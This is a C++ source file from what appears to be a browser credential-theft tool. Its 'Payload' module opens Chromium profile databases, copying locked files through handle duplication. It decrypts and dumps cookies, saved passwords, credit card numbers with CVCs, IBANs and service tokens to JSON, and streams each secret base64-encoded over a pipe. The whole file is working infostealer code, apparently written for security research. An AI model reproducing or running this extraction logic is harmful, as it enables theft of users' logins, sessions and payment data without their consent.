// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "data_extractor.hpp"
#include "handle_duplicator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <fstream>
#include <sstream>
#include <iomanip>
#include <map>
#include <windows.h>
#include <wincrypt.h>

namespace Payload {

    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase)
        : m_pipe(pipe), m_key(key), m_outputBase(outputBase) {}

    sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
        sqlite3* db = nullptr;
        std::string uri = "file:" + dbPath.string() + "?nolock=1";
        if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK) {
            if (db) sqlite3_close(db);
            return nullptr;
        }
        return db;
    }

    sqlite3* DataExtractor::OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath) {
        sqlite3* db = OpenDatabase(dbPath);
        if (db) {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, "SELECT 1", -1, &stmt, nullptr) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    sqlite3_finalize(stmt);
                    return db;
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
            db = nullptr;
        }

        HandleDuplicator duplicator;

        auto tempDir = m_outputBase / ".temp";
        auto tempDbPath = duplicator.CopyLockedFile(dbPath, tempDir);

        if (!tempDbPath) {
            return nullptr;
        }

        m_tempFiles.push_back(*tempDbPath);

        return OpenDatabase(*tempDbPath);
    }

    void DataExtractor::CleanupTempFiles() {
        for (const auto& tempFile : m_tempFiles) {
            try {
                if (std::filesystem::exists(tempFile)) {
                    std::filesystem::remove(tempFile);
                }
            } catch (...) {
                // Ignore cleanup failures
            }
        }
        m_tempFiles.clear();

        try {
            auto tempDir = m_outputBase / ".temp";
            if (std::filesystem::exists(tempDir) && std::filesystem::is_empty(tempDir)) {
                std::filesystem::remove(tempDir);
            }
        } catch (...) {}
    }

    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
        m_pipe.Log("PROFILE:" + profilePath.filename().string());

        try {
            // Cookies
            auto cookiePath = profilePath / "Network" / "Cookies";
            if (std::filesystem::exists(cookiePath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(cookiePath)) {
                    ExtractCookies(db, m_outputBase / browserName / profilePath.filename() / "cookies.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        try {
            // Passwords (local)
            auto loginPath = profilePath / "Login Data";
            if (std::filesystem::exists(loginPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
                    ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        try {
            // Passwords (account-synced)
            auto loginAccountPath = profilePath / "Login Data For Account";
            if (std::filesystem::exists(loginAccountPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(loginAccountPath)) {
                    ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords_account.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        try {
            // Cards & IBANs & Tokens (Web Data)
            auto webDataPath = profilePath / "Web Data";
            if (std::filesystem::exists(webDataPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(webDataPath)) {
                    ExtractCards(db, m_outputBase / browserName / profilePath.filename() / "cards.json");
                    ExtractIBANs(db, m_outputBase / browserName / profilePath.filename() / "iban.json");
                    ExtractTokens(db, m_outputBase / browserName / profilePath.filename() / "tokens.json");
                    sqlite3_close(db);
                }
            }
        } catch(...) {}

        CleanupTempFiles();
    }

    // Helper function to base64 encode
    std::string Base64Encode(const std::string& input) {
        if (input.empty()) return "";
        
        DWORD encodedSize = 0;
        if (!CryptBinaryToStringA((const BYTE*)input.data(), (DWORD)input.size(), 
                                 CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &encodedSize)) {
            return ""; // Return empty on failure
        }
        
        std::string encoded;
        encoded.resize(encodedSize);
        if (!CryptBinaryToStringA((const BYTE*)input.data(), (DWORD)input.size(), 
                                 CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &encoded[0], &encodedSize)) {
            return ""; // Return empty on failure
        }
        
        // Remove null terminator
        if (!encoded.empty() && encoded.back() == '\0') {
            encoded.pop_back();
        }
        return encoded;
    }

    void DataExtractor::ExtractCookies(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies";
        
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        int total = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            total++;
            const void* blob = sqlite3_column_blob(stmt, 6);
            int blobLen = sqlite3_column_bytes(stmt, 6);
            
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                
                if (decrypted && !decrypted->empty()) {
                    std::string val;
                    if (decrypted->size() > 32) {
                        val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                    } else {
                        val = std::string((char*)decrypted->data(), decrypted->size());
                    }

                    // Get all fields
                    std::string domain = sqlite3_column_text(stmt, 0) ? (char*)sqlite3_column_text(stmt, 0) : "";
                    std::string name = sqlite3_column_text(stmt, 1) ? (char*)sqlite3_column_text(stmt, 1) : "";
                    std::string path = sqlite3_column_text(stmt, 2) ? (char*)sqlite3_column_text(stmt, 2) : "/";
                    std::string expires = std::to_string(sqlite3_column_int64(stmt, 5));
                    bool secure = sqlite3_column_int(stmt, 3) != 0;
                    bool httpOnly = sqlite3_column_int(stmt, 4) != 0;
                    
                    // Base64 encode ALL text fields for pipe transmission
                    std::string encodedDomain = Base64Encode(domain);
                    std::string encodedName = Base64Encode(name);
                    std::string encodedValue = Base64Encode(val);
                    std::string encodedPath = Base64Encode(path);
                    
                    // Format: COOKIE_DETAIL:BASE64(domain)|BASE64(name)|BASE64(value)|expires|secure|httponly|BASE64(path)
                    std::string cookieMsg = "COOKIE_DETAIL:" + encodedDomain + "|" + encodedName + "|" + 
                                          encodedValue + "|" + expires + "|" +
                                          (secure ? "1" : "0") + "|" + (httpOnly ? "1" : "0") + "|" +
                                          encodedPath;
                    m_pipe.Log(cookieMsg);

                    // JSON output still uses JSON escaping
                    std::stringstream ss;
                    ss << "{\"host\":\"" << EscapeJson(domain) << "\","
                       << "\"name\":\"" << EscapeJson(name) << "\","
                       << "\"path\":\"" << EscapeJson(path) << "\","
                       << "\"is_secure\":" << (secure ? "true" : "false") << ","
                       << "\"is_httponly\":" << (httpOnly ? "true" : "false") << ","
                       << "\"expires\":" << expires << ","
                       << "\"value\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
        }
    }

    void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 2);
            int blobLen = sqlite3_column_bytes(stmt, 2);
            
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                
                if (decrypted) {
                    std::string val((char*)decrypted->data(), decrypted->size());
                    
                    // Get fields
                    std::string url = sqlite3_column_text(stmt, 0) ? (char*)sqlite3_column_text(stmt, 0) : "";
                    std::string user = sqlite3_column_text(stmt, 1) ? (char*)sqlite3_column_text(stmt, 1) : "";
                    
                    // Base64 encode ALL fields for pipe transmission
                    std::string encodedUrl = Base64Encode(url);
                    std::string encodedUser = Base64Encode(user);
                    std::string encodedPass = Base64Encode(val);
                    
                    // Format: PASSWORD_DETAIL:BASE64(url)|BASE64(username)|BASE64(password)
                    std::string passMsg = "PASSWORD_DETAIL:" + encodedUrl + "|" + encodedUser + "|" + encodedPass;
                    m_pipe.Log(passMsg);

                    // JSON output
                    std::stringstream ss;
                    ss << "{\"url\":\"" << EscapeJson(url) << "\","
                       << "\"user\":\"" << EscapeJson(user) << "\","
                       << "\"pass\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("PASSWORDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractCards(sqlite3* db, const std::filesystem::path& outFile) {
        // 1. Load CVCs
        std::map<std::string, std::string> cvcMap;
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* guid = (const char*)sqlite3_column_text(stmt, 0);
                const void* blob = sqlite3_column_blob(stmt, 1);
                int len = sqlite3_column_bytes(stmt, 1);
                if (guid && blob && len > 0) {
                    std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                    auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                    if (dec) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                }
            }
            sqlite3_finalize(stmt);
        }

        // 2. Extract Cards
        if (sqlite3_prepare_v2(db, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* guid = (const char*)sqlite3_column_text(stmt, 0);
            const void* blob = sqlite3_column_blob(stmt, 4);
            int len = sqlite3_column_bytes(stmt, 4);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string num((char*)dec->data(), dec->size());
                    std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "";
                    
                    // Get fields
                    std::string name = sqlite3_column_text(stmt, 1) ? (char*)sqlite3_column_text(stmt, 1) : "";
                    int month = sqlite3_column_int(stmt, 2);
                    int year = sqlite3_column_int(stmt, 3);
                    std::string expiry = std::to_string(month) + "/" + std::to_string(year);
                    
                    // Base64 encode ALL fields for pipe transmission
                    std::string encodedName = Base64Encode(name);
                    std::string encodedNum = Base64Encode(num);
                    std::string encodedExpiry = Base64Encode(expiry);
                    std::string encodedCvc = Base64Encode(cvc);
                    
                    // Format: CARD_DETAIL:BASE64(name)|BASE64(number)|BASE64(expiry)|BASE64(cvc)
                    std::string cardMsg = "CARD_DETAIL:" + encodedName + "|" + encodedNum + "|" + encodedExpiry + "|" + encodedCvc;
                    m_pipe.Log(cardMsg);

                    // JSON output
                    std::stringstream ss;
                    ss << "{\"name\":\"" << EscapeJson(name) << "\","
                       << "\"month\":" << month << ","
                       << "\"year\":" << year << ","
                       << "\"number\":\"" << EscapeJson(num) << "\","
                       << "\"cvc\":\"" << EscapeJson(cvc) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("CARDS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT value_encrypted, nickname FROM local_ibans", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 0);
            int len = sqlite3_column_bytes(stmt, 0);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string val((char*)dec->data(), dec->size());
                    
                    // Get fields
                    std::string nickname = sqlite3_column_text(stmt, 1) ? (char*)sqlite3_column_text(stmt, 1) : "";
                    
                    // Base64 encode ALL fields for pipe transmission
                    std::string encodedNickname = Base64Encode(nickname);
                    std::string encodedIban = Base64Encode(val);
                    
                    // Format: IBAN_DETAIL:BASE64(nickname)|BASE64(iban)
                    std::string ibanMsg = "IBAN_DETAIL:" + encodedNickname + "|" + encodedIban;
                    m_pipe.Log(ibanMsg);

                    // JSON output
                    std::stringstream ss;
                    ss << "{\"nickname\":\"" << EscapeJson(nickname) << "\","
                       << "\"iban\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("IBANS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractTokens(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        bool hasBindingKey = true;
        
        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token, binding_key FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) {
            hasBindingKey = false;
            if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) return;
        }

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 1);
            int len = sqlite3_column_bytes(stmt, 1);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
                if (dec) {
                    std::string val((char*)dec->data(), dec->size());
                    std::string bindingKey = "";
                    
                    if (hasBindingKey) {
                        const void* bKeyBlob = sqlite3_column_blob(stmt, 2);
                        int bKeyLen = sqlite3_column_bytes(stmt, 2);
                        if (bKeyBlob && bKeyLen > 0) {
                            std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
                            auto decKey = Crypto::AesGcm::Decrypt(m_key, encKey);
                            if (decKey) {
                                bindingKey = std::string((char*)decKey->data(), decKey->size());
                            }
                        }
                    }

                    // Get fields
                    std::string service = sqlite3_column_text(stmt, 0) ? (char*)sqlite3_column_text(stmt, 0) : "";
                    
                    // Base64 encode ALL fields for pipe transmission
                    std::string encodedService = Base64Encode(service);
                    std::string encodedToken = Base64Encode(val);
                    std::string encodedBindingKey = Base64Encode(bindingKey);
                    
                    // Format: TOKEN_DETAIL:BASE64(service)|BASE64(token)|BASE64(binding_key)
                    std::string tokenMsg = "TOKEN_DETAIL:" + encodedService + "|" + encodedToken + "|" + encodedBindingKey;
                    m_pipe.Log(tokenMsg);

                    // JSON output
                    std::stringstream ss;
                    ss << "{\"service\":\"" << EscapeJson(service) << "\","
                       << "\"token\":\"" << EscapeJson(val) << "\","
                       << "\"binding_key\":\"" << EscapeJson(bindingKey) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
        }
    }

    std::string DataExtractor::EscapeJson(const std::string& s) {
        std::ostringstream o;
        for (char c : s) {
            if (c == '"') o << "\\\"";
            else if (c == '\\') o << "\\\\";
            else if (c == '\b') o << "\\b";
            else if (c == '\f') o << "\\f";
            else if (c == '\n') o << "\\n";
            else if (c == '\r') o << "\\r";
            else if (c == '\t') o << "\\t";
            else if ('\x00' <= c && c <= '\x1f') o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else o << c;
        }
        return o.str();
    }

}